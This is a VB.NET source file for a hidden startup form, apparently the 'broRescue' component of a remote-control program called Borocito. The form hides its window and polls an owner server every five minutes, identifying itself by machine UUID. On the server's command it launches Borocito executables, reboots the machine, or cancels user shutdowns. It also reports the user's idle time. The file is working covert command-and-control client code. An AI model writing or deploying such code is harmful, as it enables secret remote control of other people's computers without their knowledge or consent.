Imports System.IO
Imports System.Net
Imports System.Net.Http
Imports System.Runtime.InteropServices
Public Class Init
    Dim threadReader As Threading.Thread
    Dim AFKTime As UInteger
    Dim lastCommand As String
    Dim NoShutdown As Boolean = False
    Private Sub Init_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Try
            StartUp.Init()
            CheckForIllegalCrossThreadCalls = False
            threadReader = New Threading.Thread(AddressOf ReadingCommand)
            threadReader.Start()
            INPUT.cbSize = Marshal.SizeOf(INPUT)
            ReadParameters(Command())
            Me.Hide()
        Catch ex As Exception
            AddToLog("Init_Load@Init", "Error: " & ex.Message, True)
        End Try
        AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf SessionEvent
    End Sub

    Sub ReadParameters(ByVal parametros As String)
        Try
            If parametros <> Nothing Then
                Dim parameter As String = parametros
                Dim args() As String = parameter.Split(" ")

                If args(0).ToLower = "/getafk" Then
                    BoroHearSendContent(CheckInactivity())
                Else
                    ReadCommand(args(0))
                End If

            End If
        Catch ex As Exception
            AddToLog("ReadParameters@Init", "Error: " & ex.Message, True)
        End Try
    End Sub

    Sub ReadingCommand()
        While True
            Try
                AddToLog("ReadingCommand@Init", "Reading command from server...")

                Dim comandos As String = Nothing

                Using client As New HttpClient()
                    client.DefaultRequestHeaders.Add("User-Agent", "Borocito broRescue")
                    client.DefaultRequestHeaders.Add("UUID", UID)

                    Dim response As HttpResponseMessage = client.GetAsync(
                            HttpOwnerServer & "/api/instance/"
                        ).Result

                    Dim respuestaTexto As String = response.Content.ReadAsStringAsync().Result

                    If response.IsSuccessStatusCode Then
                        comandos = respuestaTexto
                    End If
                End Using

                If comandos Is Nothing Then
                    AddToLog("ReadingCommand@Init", "    Retrying...")
                    Continue While
                End If

                Dim commandOne As String = comandos.Split(Environment.NewLine)(1).Split(">"c)(1).Trim()
                If commandOne <> Nothing Then
                    If lastCommand <> commandOne Then
                        If commandOne.StartsWith("broRescue") Then
                            ReadCommand(commandOne)
                            lastCommand = commandOne
                        End If
                    End If
                End If

                Threading.Thread.Sleep(300000) '5 minutos
            Catch ex As Exception
                AddToLog("ReadingCommand@Init", "Error: " & ex.Message, True)
            End Try
        End While
    End Sub

    Sub ReadCommand(ByVal command As String)
        Try
            AddToLog("ReadCommand@Init", "Processing: " & command)
            If command.Contains("Borocito") Then
                Process.Start(DIRCommons & "\Borocito.exe")
            ElseIf command.Contains("Extractor") Then
                Process.Start(DIRCommons & "\BorocitoExtractor.exe")
            ElseIf command.Contains("Updater") Then
                Process.Start(DIRCommons & "\BorocitoUpdater.exe")
            ElseIf command.Contains("Restart") Then
                Process.Start("shutdown.exe", "/r")
            ElseIf command.Contains("NoShutdown") Then
                NoShutdown = True
            ElseIf command.Contains("YesShutdown") Then
                NoShutdown = False
            End If
        Catch ex As Exception
            AddToLog("ReadCommand@Init", "Error: " & ex.Message, True)
        End Try
    End Sub

    Private Declare Function GetLastInputInfo Lib "user32" (ByRef plii As pLASTINPUTINFO) As Boolean
    Structure pLASTINPUTINFO
        Public cbSize As Integer
        Public dwTime As Integer
    End Structure
    Dim INPUT As New pLASTINPUTINFO()
    Function CheckInactivity() As UInteger
        Try
            AddToLog("CheckInactivity@Init", "Get AFK Request")
            GetLastInputInfo(INPUT)
            Dim TOTAL As Integer = Environment.TickCount
            Dim ULTIMO As Integer = INPUT.dwTime
            Dim INTERVALO As Integer = (TOTAL - ULTIMO) / 1000
            Return INTERVALO
        Catch ex As Exception
            Return AddToLog("CheckInactivity@Init", "Error: " & ex.Message, True)
        End Try
    End Function

    Sub SessionEvent(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
        Try
            If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
                Console.WriteLine("[SessionEvent]User is logging off!")
            ElseIf e.Reason = Microsoft.Win32.SessionEndReasons.SystemShutdown Then
                Console.WriteLine("[SessionEvent]System is shutting down!")
            Else
                Console.WriteLine("[SessionEvent]Something happend!")
            End If
            If NoShutdown Then
                Process.Start("shutdown.exe", "/a")
            End If
        Catch ex As Exception
            Console.WriteLine("[SessionEvent]Error: " & ex.Message)
        End Try
    End Sub
End Class